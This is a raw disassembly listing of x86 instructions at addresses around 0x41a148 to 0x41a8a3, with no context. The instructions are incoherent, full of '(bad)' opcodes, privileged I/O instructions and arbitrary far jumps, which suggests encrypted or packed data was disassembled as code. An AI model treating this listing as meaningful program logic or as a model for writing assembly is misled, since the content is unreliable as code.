  41a148:	out    0xb7,eax
  41a14a:	xchg   esi,eax
  41a14b:	push   edi
  41a14c:	fadd   DWORD PTR [edi]
  41a14e:	jle    0x41a103
  41a150:	pop    ebx
  41a151:	jnp    0x41a13c
  41a153:	pop    ebx
  41a154:	pushf  
  41a155:	pop    edi
  41a156:	jbe    0x41a1d2
  41a158:	xor    eax,0xe73a7ba8
  41a15d:	(bad)
  41a161:	shl    BYTE PTR [eax],0xe3
  41a164:	jmp    0xd382:0xd774bf
  41a16b:	ja     0x41a151
  41a16d:	popa   
  41a16e:	mov    bh,0x31
  41a170:	lea    ebp,[eax+0x73bfa17d]
  41a176:	popa   
  41a177:	shr    edi,1
  41a179:	inc    edx
  41a17a:	mov    fs,edi
  41a17c:	shr    BYTE PTR ds:0x165ae8ee,cl
  41a182:	jl     0x41a13d
  41a184:	or     BYTE PTR [esi+0xfc0904c],0xd2
  41a18b:	fstp   QWORD PTR [ecx]
  41a18d:	mov    WORD PTR [ecx-0x2],es
  41a190:	cwde   
  41a191:	xchg   ebp,eax
  41a192:	xchg   edx,eax
  41a193:	push   0xffffffe5
  41a195:	add    edx,edx
  41a197:	cli    
  41a198:	and    DWORD PTR [edx],edi
  41a19a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a19b:	test   BYTE PTR [eax+0x59],dl
  41a19e:	repnz retf 0x6ba4
  41a1a2:	mov    bh,0xfb
  41a1a4:	pop    esp
  41a1a5:	(bad)  
  41a1a6:	jg     0x41a1c9
  41a1a8:	lahf   
  41a1a9:	jle    0x41a1e1
  41a1ab:	mov    ecx,0xe7c0ca08
  41a1b0:	rcr    DWORD PTR [ebp+edi*8-0x5e966c3d],1
  41a1b7:	sbb    al,0x86
  41a1b9:	add    al,0xbf
  41a1bb:	aaa    
  41a1bc:	push   edi
  41a1bd:	push   edx
  41a1be:	iret   
  41a1bf:	out    dx,eax
  41a1c0:	bound  eax,QWORD PTR [ebp-0x5b]
  41a1c3:	mov    al,0x23
  41a1c5:	popf   
  41a1c6:	and    dl,BYTE PTR [edi-0x5d]
  41a1c9:	in     al,dx
  41a1ca:	stos   DWORD PTR es:[edi],eax
  41a1cb:	rcl    BYTE PTR [esi],cl
  41a1cd:	mov    WORD PTR [ebp-0x5],?
  41a1d0:	xor    BYTE PTR [edi-0xa30d849],0xb4
  41a1d7:	xchg   ebp,eax
  41a1d8:	or     ebx,DWORD PTR [esi-0x70bad68a]
  41a1de:	jno    0x41a210
  41a1e0:	cmc    
  41a1e1:	jl     0x41a1b4
  41a1e3:	imul   ebx,DWORD PTR [edx-0x122c3ad4],0x687dbe5d
  41a1ed:	outs   dx,BYTE PTR ds:[esi]
  41a1ee:	mov    ds:0x5261c176,al
  41a1f3:	retf   
  41a1f4:	scas   al,BYTE PTR es:[edi]
  41a1f5:	pop    esi
  41a1f6:	sub    al,0xf
  41a1f8:	dec    ecx
  41a1f9:	sbb    DWORD PTR [ecx],ebx
  41a1fb:	add    eax,0x2e6f8963
  41a200:	pop    ecx
  41a201:	dec    esi
  41a202:	pop    edi
  41a203:	es in  al,dx
  41a205:	inc    edi
  41a206:	popf   
  41a207:	int    0x6c
  41a209:	cmc    
  41a20a:	cmp    al,0x10
  41a20c:	push   eax
  41a20d:	in     al,0x41
  41a20f:	outs   dx,DWORD PTR cs:[esi]
  41a211:	imul   eax,DWORD PTR [ebx+0x41],0x775ad201
  41a218:	mov    ?,WORD PTR ss:[ecx]
  41a21b:	mov    edx,0xc694e471
  41a220:	cmp    esi,DWORD PTR [ebx+ebp*8-0x64]
  41a224:	popf   
  41a225:	xchg   ebp,eax
  41a226:	mov    ah,0x93
  41a228:	mul    dh
  41a22a:	loope  0x41a23b
  41a22c:	dec    edi
  41a22d:	sbb    eax,0xb64e39a3
  41a232:	jge    0x41a1b7
  41a234:	pop    es
  41a235:	xor    al,0xac
  41a237:	je     0x41a244
  41a239:	in     eax,dx
  41a23a:	mov    ebp,0x1641eb03
  41a23f:	add    al,0xcf
  41a241:	pop    DWORD PTR [ecx+0x3bf6824c]
  41a247:	popa   
  41a248:	cdq    
  41a249:	test   DWORD PTR [ebx+0x4f],0x7e29acac
  41a250:	int    0x6f
  41a252:	loope  0x41a29f
  41a254:	push   eax
  41a255:	sbb    ah,dl
  41a257:	out    0xfa,al
  41a259:	mul    esp
  41a25b:	loop   0x41a2cd
  41a25d:	mov    esi,0xadc5bf48
  41a262:	push   ebp
  41a263:	das    
  41a264:	push   ecx
  41a265:	fmul   DWORD PTR [ecx+edx*8]
  41a268:	jno    0x41a1f8
  41a26a:	clc    
  41a26b:	je     0x41a219
  41a26d:	div    BYTE PTR [ebx+0x1eaa6c99]
  41a273:	outs   dx,BYTE PTR ds:[esi]
  41a274:	and    edi,DWORD PTR [eax]
  41a276:	mov    dh,0xd6
  41a278:	inc    ebx
  41a279:	dec    ecx
  41a27a:	mov    al,0xd2
  41a27c:	fild   DWORD PTR [eax-0x4f33bcea]
  41a282:	das    
  41a283:	or     edi,edi
  41a285:	cmp    eax,0xba3efd28
  41a28a:	cdq    
  41a28b:	inc    edi
  41a28c:	xor    ebp,ebp
  41a28e:	into   
  41a28f:	xchg   dh,dl
  41a291:	jne    0x41a2e2
  41a293:	enter  0xfbac,0x2b
  41a297:	jbe    0x41a2b6
  41a299:	clc    
  41a29a:	push   ds
  41a29b:	mov    dl,0x21
  41a29d:	outs   dx,BYTE PTR ds:[esi]
  41a29e:	fldenv [esi-0x4b92dd0e]
  41a2a4:	pop    ds
  41a2a5:	jmp    0x41a2de
  41a2a7:	xchg   ecx,eax
  41a2a8:	cwde   
  41a2a9:	xchg   esi,eax
  41a2aa:	or     BYTE PTR [esi-0x33],bl
  41a2ad:	pop    ebx
  41a2ae:	jge    0x41a2ac
  41a2b0:	cmp    dh,ch
  41a2b2:	fs xor al,0x6f
  41a2b5:	call   0x234c74bb
  41a2ba:	imul   ebp,DWORD PTR [ecx+eiz*8+0x7c5607c1],0x3ef05df1
  41a2c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c6:	idiv   BYTE PTR [ecx-0x42e2d3c1]
  41a2cc:	push   ds
  41a2cd:	in     al,dx
  41a2ce:	ins    DWORD PTR es:[edi],dx
  41a2cf:	cmp    edi,ebx
  41a2d1:	(bad)  
  41a2d2:	sub    edx,DWORD PTR [edi-0x5e]
  41a2d5:	add    ebp,DWORD PTR [ebx]
  41a2d7:	mov    al,ds:0x86738cd7
  41a2dc:	cli    
  41a2dd:	ror    DWORD PTR [ecx-0x5af00b4b],1
  41a2e3:	in     eax,0x8a
  41a2e5:	(bad)  
  41a2e6:	popa   
  41a2e7:	and    edi,esi
  41a2e9:	imul   eax,DWORD PTR [esi+0x6489427a],0x33
  41a2f0:	hlt    
  41a2f1:	(bad)  
  41a2f2:	jl     0x41a363
  41a2f4:	dec    ebx
  41a2f5:	(bad)  
  41a2f6:	bound  edi,QWORD PTR [edx]
  41a2f8:	popf   
  41a2f9:	or     dh,BYTE PTR [esi-0x23]
  41a2fc:	leave  
  41a2fd:	xchg   BYTE PTR [esi+0x53],bl
  41a300:	out    0x2b,eax
  41a302:	push   ebx
  41a303:	jp     0x41a32f
  41a305:	mov    WORD PTR [edi+esi*4-0x17003c22],gs
  41a30c:	xor    DWORD PTR [esp+edi*1+0x5f361a77],0x51
  41a314:	outs   dx,DWORD PTR ds:[esi]
  41a315:	mov    DWORD PTR [edi],esi
  41a317:	mov    bl,cl
  41a319:	jbe    0x41a2b0
  41a31b:	mov    bl,0x5e
  41a31d:	(bad)  
  41a31e:	lahf   
  41a31f:	mov    ds:0x3f61dcaa,eax
  41a324:	push   edi
  41a325:	iret   
  41a326:	(bad)  
  41a327:	retf   
  41a328:	pop    ds
  41a329:	sub    eax,0x4b194654
  41a32e:	int3   
  41a32f:	dec    ebp
  41a330:	ins    DWORD PTR es:[edi],dx
  41a331:	cdq    
  41a332:	hlt    
  41a333:	pop    esp
  41a334:	test   BYTE PTR [ecx],ch
  41a336:	mov    ecx,0x8de22cce
  41a33b:	mov    ds:0x5d13f568,al
  41a340:	xchg   esi,eax
  41a341:	in     al,dx
  41a342:	dec    esp
  41a343:	ja     0x41a324
  41a345:	sub    ah,BYTE PTR [ecx-0x37abdea]
  41a34b:	cld    
  41a34c:	jecxz  0x41a3c3
  41a34e:	mov    esi,0x42625684
  41a353:	loope  0x41a337
  41a355:	or     edx,ebx
  41a357:	gs xor al,0x21
  41a35a:	push   ebp
  41a35b:	add    DWORD PTR [esi],esi
  41a35d:	hlt    
  41a35e:	call   0x165a:0x5d47735a
  41a365:	dec    edi
  41a366:	(bad)  
  41a367:	xchg   ecx,eax
  41a368:	or     DWORD PTR [edi+0x2],esp
  41a36b:	sbb    al,bl
  41a36d:	nop
  41a36e:	sub    BYTE PTR [esi+eiz*4+0x70],0xfc
  41a373:	xchg   edi,eax
  41a374:	test   eax,0xeeb66c54
  41a379:	pop    es
  41a37a:	xchg   ecx,eax
  41a37b:	ret    
  41a37c:	mov    eax,0x57abb3de
  41a381:	jno    0x41a391
  41a383:	pop    ecx
  41a384:	xchg   ebx,eax
  41a385:	es jp  0x41a315
  41a388:	arpl   WORD PTR [eax-0x2f2d3229],bx
  41a38e:	jo     0x41a39d
  41a390:	xor    BYTE PTR [ecx],dl
  41a392:	dec    esp
  41a393:	ret    
  41a394:	in     eax,0xa8
  41a396:	sti    
  41a397:	jbe    0x41a3f3
  41a399:	xchg   esp,edi
  41a39b:	mov    dh,0xae
  41a39d:	xchg   BYTE PTR [esi+0x66ca183c],dl
  41a3a3:	xlat   BYTE PTR ds:[ebx]
  41a3a4:	xor    DWORD PTR [esi+esi*2],ecx
  41a3a7:	add    edx,DWORD PTR [ebx+0x3b0b1196]
  41a3ad:	hlt    
  41a3ae:	les    edi,FWORD PTR [edx]
  41a3b0:	adc    dl,bl
  41a3b2:	test   edx,ebx
  41a3b4:	jle    0x41a402
  41a3b6:	aaa    
  41a3b7:	dec    ecx
  41a3b8:	push   ebp
  41a3b9:	xchg   edx,eax
  41a3ba:	dec    eax
  41a3bb:	in     eax,dx
  41a3bc:	cmp    ecx,eax
  41a3be:	js     0x41a353
  41a3c0:	cmp    BYTE PTR [eax-0x54],dl
  41a3c3:	outs   dx,DWORD PTR ds:[esi]
  41a3c4:	call   0xd28ade07
  41a3c9:	div    DWORD PTR [edi+0x7b]
  41a3cc:	mov    ds:0x841110e4,al
  41a3d1:	dec    esp
  41a3d2:	jmp    0x6ce6f8ac
  41a3d7:	mov    ah,0xb1
  41a3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3da:	(bad)  
  41a3db:	data16 sub al,0x2a
  41a3de:	dec    ebx
  41a3df:	dec    eax
  41a3e0:	sub    al,0x59
  41a3e2:	sbb    al,0x2
  41a3e4:	iretw  
  41a3e6:	das    
  41a3e7:	into   
  41a3e8:	add    esi,DWORD PTR [ebp+0x30]
  41a3eb:	stos   DWORD PTR es:[edi],eax
  41a3ec:	pop    edx
  41a3ed:	adc    DWORD PTR [ebx],edi
  41a3ef:	clc    
  41a3f0:	mov    BYTE PTR [ecx+0x7a22a61],dh
  41a3f6:	xchg   edx,eax
  41a3f7:	jno    0x41a380
  41a3f9:	ds or  al,0xc0
  41a3fc:	xchg   BYTE PTR [edx*4+0x484dbfcb],ch
  41a403:	outs   dx,BYTE PTR ds:[esi]
  41a404:	xchg   BYTE PTR [esp+edi*8+0x1cd7191],bl
  41a40b:	push   ds
  41a40c:	rcr    BYTE PTR [esi],0xe
  41a40f:	in     al,0x73
  41a411:	cmp    DWORD PTR [eax+0x6cfe8887],esi
  41a417:	and    dh,0xaa
  41a41a:	dec    edi
  41a41b:	cmp    al,0x1f
  41a41d:	pop    ds
  41a41e:	sub    ebp,esp
  41a420:	out    0xf3,eax
  41a422:	(bad)  
  41a423:	dec    ebx
  41a424:	push   ss
  41a425:	sbb    al,0xb0
  41a427:	into   
  41a428:	add    al,BYTE PTR [ecx]
  41a42a:	pop    ebx
  41a42b:	in     eax,0xc4
  41a42d:	not    BYTE PTR [esi+0x45]
  41a430:	xor    BYTE PTR [edi+0x2c],bl
  41a433:	mov    ds:0xdb48580b,al
  41a438:	xor    al,0x99
  41a43a:	mov    esi,0xb0e21b68
  41a43f:	cmc    
  41a440:	xchg   DWORD PTR ds:0x1e92c4ff,ecx
  41a446:	push   esi
  41a447:	lods   al,BYTE PTR ds:[esi]
  41a448:	(bad)  
  41a449:	(bad)  
  41a44a:	fiadd  WORD PTR [ebx+0x5ae8c89a]
  41a450:	es mov ecx,0xe4f9d352
  41a456:	pop    ebx
  41a457:	add    bh,BYTE PTR [eax-0x7dbcb1f3]
  41a45d:	out    0x2e,eax
  41a45f:	stos   DWORD PTR es:[edi],eax
  41a460:	jb     0x41a4a1
  41a462:	fisttp QWORD PTR [ebx]
  41a464:	loope  0x41a44e
  41a466:	fnsavew [edx-0x2b]
  41a46a:	clc    
  41a46b:	mov    ebp,0x9a1c612f
  41a470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a471:	lods   al,BYTE PTR ds:[esi]
  41a472:	in     eax,dx
  41a473:	inc    ebp
  41a474:	fst    st(3)
  41a476:	mov    al,BYTE PTR [esi+0x49]
  41a479:	ret    
  41a47a:	mov    ch,0xfb
  41a47c:	out    dx,eax
  41a47d:	test   DWORD PTR [ebx],ebx
  41a47f:	dec    edx
  41a480:	les    esp,FWORD PTR [esi+ebp*1+0x27]
  41a484:	ret    
  41a485:	cmc    
  41a486:	push   ds
  41a487:	repnz int 0x13
  41a48a:	add    al,0x9a
  41a48c:	push   ebx
  41a48d:	das    
  41a48e:	dec    edx
  41a48f:	inc    esi
  41a490:	rcr    ecx,cl
  41a492:	sbb    DWORD PTR [esi],0x2ec87b71
  41a498:	xchg   bx,ax
  41a49a:	sbb    eax,0x2b790f74
  41a49f:	and    esp,ebx
  41a4a1:	and    ecx,DWORD PTR [eax]
  41a4a3:	(bad)  [esi]
  41a4a5:	retf   0x7422
  41a4a8:	pushf  
  41a4a9:	mov    bl,0x4a
  41a4ab:	retf   
  41a4ac:	pop    edi
  41a4ad:	inc    ebp
  41a4ae:	cwde   
  41a4af:	aad    0x5d
  41a4b1:	popf   
  41a4b2:	(bad)  
  41a4b3:	aas    
  41a4b4:	js     0x41a4a2
  41a4b6:	sbb    BYTE PTR [edi],ch
  41a4b8:	adc    bl,BYTE PTR [edi-0x5568ad59]
  41a4be:	jbe    0x41a53f
  41a4c0:	fnstsw WORD PTR [edx-0x3c]
  41a4c3:	and    al,0x27
  41a4c5:	sbb    ah,0xb
  41a4c8:	or     DWORD PTR [ebx-0x4d],esp
  41a4cb:	mov    bh,0xb3
  41a4cd:	cdq    
  41a4ce:	or     eax,0x689b385b
  41a4d3:	shl    BYTE PTR [ebx-0x12],cl
  41a4d6:	in     al,0xbb
  41a4d8:	pop    eax
  41a4d9:	mov    dh,0xfd
  41a4db:	sbb    BYTE PTR [ecx*8-0x75a98cd2],dl
  41a4e2:	in     al,0xd1
  41a4e4:	add    esi,esi
  41a4e6:	push   esp
  41a4e7:	not    BYTE PTR [edx-0x45]
  41a4ea:	xor    BYTE PTR [ebx],dl
  41a4ec:	jmp    0x976:0x33584350
  41a4f3:	or     ah,BYTE PTR [ebp-0x5a]
  41a4f6:	aad    0xa0
  41a4f8:	xchg   edx,eax
  41a4f9:	jg     0x41a51f
  41a4fb:	mov    DWORD PTR [ecx+0x1231c7a9],esi
  41a501:	or     eax,0xdee66176
  41a506:	xchg   esi,eax
  41a507:	inc    ebx
  41a508:	pslld  mm0,mm3
  41a50b:	mov    edi,0x97ad3d1d
  41a510:	mov    ebp,0x45939d20
  41a515:	push   edx
  41a516:	repnz xor al,0x46
  41a519:	call   0x28ebab70
  41a51e:	cmc    
  41a51f:	cli    
  41a520:	inc    ebx
  41a521:	call   0x7c49ebf0
  41a526:	mov    ds:0x617dac91,al
  41a52b:	jo     0x41a524
  41a52d:	test   al,0x75
  41a52f:	cmp    DWORD PTR [si-0x38e3],eax
  41a534:	push   esp
  41a535:	sbb    cl,ah
  41a537:	dec    edx
  41a538:	shr    BYTE PTR [edi],cl
  41a53a:	cdq    
  41a53b:	add    DWORD PTR [edx],edi
  41a53d:	rcl    esi,cl
  41a53f:	sbb    eax,0x27a9d9db
  41a544:	xchg   ebp,eax
  41a545:	jbe    0x41a58a
  41a547:	xchg   DWORD PTR [ebx-0x6c4984f5],edx
  41a54d:	dec    edx
  41a54e:	(bad)  
  41a54f:	mov    esi,DWORD PTR [edx+0x39]
  41a552:	jg     0x41a548
  41a554:	dec    esp
  41a555:	pop    ds
  41a556:	fpatan 
  41a558:	add    ch,BYTE PTR [edi+0x16]
  41a55b:	(bad)  
  41a55d:	mov    WORD PTR [ecx+edx*1],ds
  41a560:	lds    ebp,FWORD PTR [ebp+ebp*1+0x5e]
  41a564:	dec    ebp
  41a565:	imul   dl
  41a567:	inc    ebp
  41a568:	push   ebp
  41a569:	scas   eax,DWORD PTR es:[edi]
  41a56a:	push   edx
  41a56b:	lock and al,0x26
  41a56e:	arpl   WORD PTR [ebx-0x38],dx
  41a571:	xrelease mov DWORD PTR [edi+0x15519c15],0xa7deeb9e
  41a57c:	mov    ds:0x3b86bd6b,al
  41a581:	jmp    0x5287:0xefaa2583
  41a588:	hlt    
  41a589:	push   ss
  41a58a:	(bad)  
  41a58d:	xor    dl,BYTE PTR [eax-0x41]
  41a590:	lods   eax,DWORD PTR ds:[esi]
  41a591:	inc    esi
  41a592:	inc    ebx
  41a593:	xchg   BYTE PTR [edx+0x64],al
  41a596:	out    dx,eax
  41a597:	dec    esp
  41a598:	dec    ecx
  41a599:	jp     0x41a579
  41a59b:	dec    eax
  41a59c:	mov    cl,0xd9
  41a59e:	scas   al,BYTE PTR es:[edi]
  41a59f:	pop    eax
  41a5a0:	cs out dx,al
  41a5a2:	and    eax,0xedec2294
  41a5a7:	adc    BYTE PTR [edi+0x61ec9c14],ah
  41a5ad:	loop   0x41a566
  41a5af:	jns    0x41a570
  41a5b1:	inc    esi
  41a5b2:	jbe    0x41a5ff
  41a5b4:	jne    0x41a628
  41a5b6:	add    BYTE PTR [esp+edi*2-0x5c4890de],al
  41a5bd:	loope  0x41a5c4
  41a5bf:	sbb    al,0x74
  41a5c1:	pop    ebx
  41a5c2:	pop    ebx
  41a5c3:	in     al,dx
  41a5c4:	std    
  41a5c5:	enter  0x3944,0x6
  41a5c9:	pop    eax
  41a5ca:	xor    BYTE PTR [ebx-0x78],dl
  41a5cd:	inc    edi
  41a5ce:	sub    esi,DWORD PTR [esi]
  41a5d0:	jno    0x41a555
  41a5d2:	add    al,0x92
  41a5d4:	sbb    al,0x1f
  41a5d6:	sti    
  41a5d7:	and    ecx,DWORD PTR [edi-0x4869b604]
  41a5dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5de:	xchg   dl,dh
  41a5e0:	test   eax,0xdb0e9f4c
  41a5e5:	lods   eax,DWORD PTR ds:[esi]
  41a5e6:	out    dx,eax
  41a5e7:	hlt    
  41a5e8:	adc    ebp,DWORD PTR [eax-0x1b]
  41a5eb:	dec    edx
  41a5ec:	dec    ecx
  41a5ed:	pop    edi
  41a5ee:	push   es
  41a5ef:	pushf  
  41a5f0:	pop    esi
  41a5f1:	cmp    dl,BYTE PTR [eax]
  41a5f3:	add    BYTE PTR [ebp+0x21b07964],ch
  41a5f9:	jbe    0x41a63d
  41a5fb:	or     al,0x3
  41a5fd:	mov    dh,0x5f
  41a5ff:	push   esi
  41a600:	je     0x41a650
  41a602:	adc    BYTE PTR [ecx],dh
  41a604:	inc    ebx
  41a605:	mov    ?,WORD PTR [eax*1+0x5bf1b721]
  41a60c:	and    DWORD PTR [ebx+0x77],esp
  41a60f:	and    ebx,DWORD PTR [ebp-0x1d2c1c4b]
  41a615:	pop    eax
  41a616:	sti    
  41a617:	es jl  0x41a5c6
  41a61a:	mov    ah,0x7d
  41a61c:	ret    
  41a61d:	push   ecx
  41a61e:	mov    bl,0x8a
  41a620:	retf   0x15c5
  41a623:	or     al,0x15
  41a625:	sub    BYTE PTR [edx+0xf],dl
  41a628:	int3   
  41a629:	cmp    DWORD PTR [ebp-0x1f6fa8e3],edi
  41a62f:	pop    ecx
  41a630:	cmp    eax,0xfb91a926
  41a635:	push   ebx
  41a636:	xchg   edi,eax
  41a637:	outs   dx,DWORD PTR ds:[esi]
  41a638:	and    DWORD PTR [esi+ebx*4+0x3b49a091],ebx
  41a63f:	pop    esi
  41a640:	test   al,0x87
  41a642:	and    DWORD PTR [esi],0x4ecc7e29
  41a648:	dec    edx
  41a649:	or     al,0x3f
  41a64b:	push   ebp
  41a64c:	clc    
  41a64d:	mov    bl,0x65
  41a64f:	inc    esi
  41a650:	retf   
  41a651:	aaa    
  41a652:	fidivr WORD PTR ds:0xd46ba42c
  41a658:	mov    eax,ds:0x977d2f3f
  41a65d:	in     al,dx
  41a65e:	fs ja  0x41a5ea
  41a661:	loopne 0x41a61e
  41a663:	stos   BYTE PTR es:[edi],al
  41a664:	(bad)  
  41a665:	aaa    
  41a666:	dec    edx
  41a667:	les    ecx,FWORD PTR [ebp+0x2e2b2b9]
  41a66d:	aam    0x9f
  41a66f:	sub    cl,BYTE PTR [edx-0x2d]
  41a672:	cmp    DWORD PTR [esi+eiz*2],edx
  41a675:	mov    dh,0x69
  41a677:	lods   eax,DWORD PTR ds:[esi]
  41a678:	pop    edi
  41a679:	jge    0x41a6dc
  41a67b:	mov    ecx,0xb35baf66
  41a680:	daa    
  41a681:	adc    al,0x72
  41a683:	ins    DWORD PTR es:[edi],dx
  41a684:	mov    ds,WORD PTR [esi+0x4e]
  41a687:	xlat   BYTE PTR ds:[ebx]
  41a688:	iret   
  41a689:	loope  0x41a67c
  41a68b:	inc    ecx
  41a68c:	mov    ah,0xb7
  41a68e:	sub    BYTE PTR [esi+0x61],0xed
  41a692:	(bad)  
  41a693:	mov    cl,BYTE PTR [esi+ebp*1-0x6409f21b]
  41a69a:	retf   0x9812
  41a69d:	xlat   BYTE PTR ds:[ebx]
  41a69e:	cmp    ebx,DWORD PTR [ebp+0x7e]
  41a6a1:	mul    BYTE PTR [edi-0x53]
  41a6a4:	mov    esp,0x61c8496
  41a6a9:	daa    
  41a6aa:	inc    edi
  41a6ab:	nop
  41a6ac:	leave  
  41a6ad:	mov    esi,0x16fc8c46
  41a6b2:	push   ss
  41a6b3:	and    DWORD PTR [edx],eax
  41a6b5:	outs   dx,BYTE PTR ds:[esi]
  41a6b6:	mov    ch,0xc8
  41a6b8:	and    al,0xd9
  41a6ba:	or     eax,0x24641827
  41a6bf:	(bad)  
  41a6c1:	dec    esi
  41a6c2:	sub    al,0xfe
  41a6c5:	cmp    al,0x90
  41a6c7:	loopne 0x41a725
  41a6c9:	or     dl,BYTE PTR [edi]
  41a6cb:	ja     0x41a66d
  41a6cd:	pop    esi
  41a6ce:	xor    eax,0xfc77af2
  41a6d3:	mov    ebp,0x5ee1984e
  41a6d8:	test   DWORD PTR [edi-0x55344a4],esp
  41a6de:	out    0xf6,al
  41a6e0:	jmp    0x727b8a22
  41a6e5:	sub    cl,BYTE PTR [eax]
  41a6e7:	lds    edi,FWORD PTR [eax-0x7b]
  41a6ea:	cs es idiv dl
  41a6ee:	jae    0x41a729
  41a6f0:	sbb    al,0xd1
  41a6f2:	sbb    eax,0x62e65566
  41a6f7:	pop    esi
  41a6f8:	push   ebp
  41a6f9:	cmp    bh,BYTE PTR [eax+0x772f88b8]
  41a6ff:	sub    DWORD PTR [edx-0x12ae7150],0x34044ef
  41a709:	(bad)  
  41a70a:	jnp    0x41a713
  41a70c:	pusha  
  41a70d:	nop
  41a70e:	sbb    DWORD PTR [ecx+ecx*8],ebp
  41a711:	jge    0x41a6c3
  41a713:	pushf  
  41a714:	ins    BYTE PTR es:[edi],dx
  41a715:	icebp  
  41a716:	xor    al,0x5f
  41a718:	enter  0xfa0f,0xb2
  41a71c:	mov    dl,0x83
  41a71e:	pusha  
  41a71f:	cwde   
  41a720:	int3   
  41a721:	das    
  41a722:	shl    ch,1
  41a724:	or     eax,DWORD PTR [ecx]
  41a726:	in     eax,dx
  41a727:	into   
  41a728:	push   ecx
  41a729:	sbb    esi,0x20
  41a72c:	sub    al,0x93
  41a72e:	dec    esp
  41a72f:	sub    al,BYTE PTR [ebx]
  41a731:	mov    eax,ds:0xe855517c
  41a736:	mov    esp,0xc5fd1513
  41a73b:	sahf   
  41a73c:	adc    eax,0xabd3aae0
  41a741:	or     al,0xa7
  41a743:	mov    ds:0x52dc9b81,eax
  41a748:	or     esi,DWORD PTR [edi]
  41a74a:	mov    edx,0xd39d4f32
  41a74f:	mov    eax,ds:0x66ee6d27
  41a754:	adc    DWORD PTR [ecx-0x4563b1df],0x46
  41a75b:	int3   
  41a75c:	aaa    
  41a75d:	dec    esp
  41a75e:	lods   eax,DWORD PTR ds:[esi]
  41a75f:	adc    edx,DWORD PTR [edi]
  41a761:	mov    bh,0x1c
  41a763:	mov    edi,0x890dbaea
  41a768:	int    0xf3
  41a76a:	push   ebp
  41a76b:	jp     0x41a71a
  41a76d:	rcl    BYTE PTR [ecx+eiz*4],0x8d
  41a771:	jle    0x41a70f
  41a773:	fnstcw WORD PTR [edx-0x35d1dce6]
  41a779:	stc    
  41a77a:	mov    dh,0x4b
  41a77c:	fdivrp st(7),st
  41a77e:	push   esi
  41a77f:	(bad)
  41a782:	mov    ch,bl
  41a784:	inc    ebx
  41a785:	push   ds
  41a786:	ds ss loope 0x41a74c
  41a78a:	ret    0xb5fc
  41a78d:	inc    eax
  41a78e:	fdivp  st(1),st
  41a790:	test   eax,0x8b537951
  41a795:	hlt    
  41a796:	and    esi,DWORD PTR [eax+eiz*1+0x34]
  41a79a:	pop    eax
  41a79b:	rol    DWORD PTR [edx+0x71],cl
  41a79e:	lods   eax,DWORD PTR ds:[esi]
  41a79f:	xchg   edx,eax
  41a7a0:	jo     0x41a7d1
  41a7a2:	imul   edi,ecx,0x2a76358e
  41a7a8:	or     eax,0x33ba1f90
  41a7ad:	mov    edi,0xb231c93a
  41a7b2:	ret    0x2877
  41a7b5:	(bad)  
  41a7b6:	js     0x41a7cf
  41a7b8:	jae    0x41a7b4
  41a7ba:	loop   0x41a788
  41a7bc:	dec    esi
  41a7bd:	repz pop esp
  41a7bf:	mov    bl,0x35
  41a7c1:	enter  0xbe19,0x62
  41a7c5:	sbb    eax,0x122db9e2
  41a7ca:	(bad)  
  41a7cd:	inc    esp
  41a7ce:	pop    esp
  41a7cf:	lds    esi,FWORD PTR [edx+0x4b232a0]
  41a7d5:	inc    eax
  41a7d6:	sub    ebx,DWORD PTR [ebx+0x4bcc93f5]
  41a7dc:	sub    al,0x3f
  41a7de:	add    bh,dh
  41a7e0:	not    DWORD PTR [edx-0x747ef7e7]
  41a7e6:	jp     0x41a857
  41a7e8:	xlat   BYTE PTR ds:[ebx]
  41a7e9:	fsubr  DWORD PTR [edx+0x33]
  41a7ec:	icebp  
  41a7ed:	dec    esp
  41a7ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7ef:	sub    dh,cl
  41a7f1:	cmp    DWORD PTR [eax+0x37d268fd],ebx
  41a7f7:	jge    0x41a867
  41a7f9:	cmp    eax,0x59219d6f
  41a7fe:	retf   
  41a7ff:	aas    
  41a800:	lds    edi,FWORD PTR [edx]
  41a802:	and    eax,0xfad4168c
  41a807:	mov    edx,0xba1d05a9
  41a80c:	pop    ebp
  41a80d:	push   eax
  41a80e:	ss mov edi,0x9635a685
  41a814:	pop    edi
  41a815:	jnp    0x41a895
  41a817:	call   0x2797:0x880dfcc7
  41a81e:	cmp    edx,DWORD PTR [edi-0x6ed62331]
  41a824:	stc    
  41a825:	add    eax,0x25612ec
  41a82a:	pop    ds
  41a82b:	js     0x41a86d
  41a82d:	sbb    DWORD PTR ds:0xdb17d87f,edx
  41a833:	rcr    DWORD PTR [esp+edx*1+0x2],1
  41a837:	pop    es
  41a838:	push   0xc659328c
  41a83d:	in     eax,dx
  41a83e:	jno    0x41a7e8
  41a840:	loop   0x41a83b
  41a842:	jecxz  0x41a7cd
  41a844:	sbb    al,0xc9
  41a846:	arpl   WORD PTR [edi-0x14d025f8],dx
  41a84c:	call   0x529f:0x77ac6fb
  41a853:	sub    ah,al
  41a855:	and    dl,bh
  41a857:	sahf   
  41a858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a859:	add    al,0x1e
  41a85b:	push   cs
  41a85c:	xor    DWORD PTR ds:0x96ab5444,0x1f
  41a863:	inc    edi
  41a864:	jp     0x41a804
  41a866:	xchg   edi,eax
  41a867:	push   0xffffffd9
  41a869:	pop    ebx
  41a86a:	(bad)  
  41a86b:	aaa    
  41a86c:	dec    edi
  41a86d:	(bad)  
  41a86e:	mov    cl,0xa3
  41a870:	inc    eax
  41a871:	ds addr16 inc esp
  41a874:	repnz cmp ebx,DWORD PTR [esi+0x3ff8e98f]
  41a87b:	sbb    al,0x21
  41a87e:	inc    esi
  41a87f:	inc    ebp
  41a880:	push   cs
  41a881:	out    0xa3,eax
  41a883:	mov    edx,0xa00b0c58
  41a888:	jo     0x41a812
  41a88a:	outs   dx,DWORD PTR ds:[esi]
  41a88b:	push   edi
  41a88c:	orps   xmm4,xmm4
  41a88f:	pop    edx
  41a890:	push   ebx
  41a891:	dec    ebp
  41a892:	stos   BYTE PTR es:[edi],al
  41a893:	in     eax,dx
  41a894:	repnz xchg esp,eax
  41a896:	repz in eax,0x3a
  41a899:	or     bl,BYTE PTR [esi-0x637132ab]
  41a89f:	retf   
  41a8a0:	icebp  
  41a8a1:	mov    ah,0x98
  41a8a3:	sbb    BYTE PTR [eax],bl
